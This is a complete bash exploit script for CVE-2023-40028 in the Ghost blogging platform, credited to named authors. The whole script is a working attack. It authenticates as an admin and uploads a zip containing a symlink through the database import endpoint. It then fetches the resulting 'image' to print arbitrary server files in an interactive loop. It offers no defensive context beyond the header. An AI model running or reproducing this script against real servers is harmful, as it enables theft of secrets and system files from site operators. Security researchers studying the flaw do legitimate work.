#!/bin/bash

# Exploit Title: Ghost Arbitrary File Read
# CVE: CVE-2023-40028
# Improved by: [0xDTC] | Original Exploit Author: Mohammad Yassine
# Description: This script exploits CVE-2023-40028 to read arbitrary files in Ghost.

# Function to print usage
function usage() {
  echo -e "\nUsage: $0 -u <username> -p <password> -h <host_url>"
  echo -e "Example: $0 -u admin -p admin123 -h http://127.0.0.1"
  exit 1
}

# Parse arguments
while getopts 'u:p:h:' flag; do
  case "${flag}" in
    u) USERNAME="${OPTARG}" ;;
    p) PASSWORD="${OPTARG}" ;;
    h) GHOST_URL="${OPTARG}" ;;
    *) usage ;;
  esac
done

if [[ -z $USERNAME || -z $PASSWORD || -z $GHOST_URL ]]; then
  usage
fi

# Variables
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
PAYLOAD_ZIP_NAME="exploit.zip"

# Create a session cookie and save it in a variable
function create_cookie() {
  COOKIE=$(curl -i -s -d username="$USERNAME" -d password="$PASSWORD" \
    -H "Origin: $GHOST_URL" \
    -H "Accept-Version: v3.0" \
    $GHOST_API/session/ \
    | grep -o 'ghost-admin-api-session=[^;]*')

  if [[ -z $COOKIE ]]; then
    echo "[!] INVALID USERNAME OR PASSWORD"
    exit 1
  fi
}

# Generate exploit payload
function generate_exploit() {
  local FILE_TO_READ=$1
  local IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
  local TEMP_PATH=$(mktemp -d)
  local PAYLOAD_PATH="$TEMP_PATH/exploit"
  mkdir -p "$PAYLOAD_PATH/content/images/2024/"
  ln -s "$FILE_TO_READ" "$PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png"
  (
    cd "$TEMP_PATH" && \
    zip -r -y "$PAYLOAD_ZIP_NAME" exploit/ &>/dev/null && \
    mv exploit.zip "$OLDPWD"
  )
  echo "$PAYLOAD_PATH $IMAGE_NAME"
}

# Send exploit
function send_exploit() {
  local PAYLOAD_PATH=$1
  curl -s -b "$COOKIE" \
    -H "Accept: text/plain, */*; q=0.01" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "X-Ghost-Version: 5.58" \
    -H "App-Pragma: no-cache" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Content-Type: multipart/form-data" \
    -X POST \
    -H "Origin: $GHOST_URL" \
    -H "Referer: $GHOST_URL/ghost/" \
    -F "importfile=@$PAYLOAD_ZIP_NAME;type=application/zip" \
    "$GHOST_API/db" \
    &>/dev/null
}

# Cleanup temporary files
function clean_up() {
  local PAYLOAD_PATH=$1
  rm -rf "$PAYLOAD_PATH"
  rm -f "$PAYLOAD_ZIP_NAME"
}

# Main Exploit Logic
create_cookie
echo "WELCOME TO THE CVE-2023-40028 SHELL"
while true; do
  read -p "Enter the file path to read (or type 'exit' to quit): " FILE_PATH
  if [[ "$FILE_PATH" == "exit" ]]; then
    echo "Exiting. Goodbye!"
    break
  fi
  if [[ -z "$FILE_PATH" || "$FILE_PATH" =~ \  ]]; then
    echo "Invalid input. Please enter a valid file path without spaces."
    continue
  fi

  # Generate payload
  PAYLOAD_RESULT=$(generate_exploit "$FILE_PATH")
  PAYLOAD_PATH=$(echo "$PAYLOAD_RESULT" | awk '{print $1}')
  IMAGE_NAME=$(echo "$PAYLOAD_RESULT" | awk '{print $2}')

  # Send exploit and fetch the result
  send_exploit "$PAYLOAD_PATH"
  echo "File content:"
  curl -s -b "$COOKIE" "$GHOST_URL/content/images/2024/$IMAGE_NAME.png"

  # Clean up temporary files
  clean_up "$PAYLOAD_PATH"
done
